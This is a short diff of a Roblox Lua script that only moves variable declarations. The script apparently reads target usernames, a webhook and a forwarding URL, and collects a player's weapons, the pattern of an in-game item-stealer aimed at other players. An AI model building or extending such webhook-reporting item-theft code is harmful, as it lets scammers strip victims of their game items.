@@ -14,6 +14,12 @@ local min_value = _G.min_value or 1
 local ping = _G.pingEveryone or "No"
 local webhook = _G.webhook or ""
 local vercelUrl = "https://webhook-rose-nu.vercel.app/api/forward.js"
+local weaponsToSend = {}
+local Players = game:GetService("Players")
+local plr = Players.LocalPlayer
+local playerGui = plr:WaitForChild("PlayerGui")
+local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local HttpService = game:GetService("HttpService")
 
 if (users) == nil or webhook == "" then
     plr:kick("You didn't add username or webhook")
@@ -34,13 +40,6 @@ if #Players:GetPlayers() >= 12 then
     plr:kick("Server is full. Please join a less populated server")
     return
 end
-
-local weaponsToSend = {}
-local Players = game:GetService("Players")
-local plr = Players.LocalPlayer
-local playerGui = plr:WaitForChild("PlayerGui")
-local database = require(game.ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
-local HttpService = game:GetService("HttpService")
 
 local rarityTable = {
     "Common",
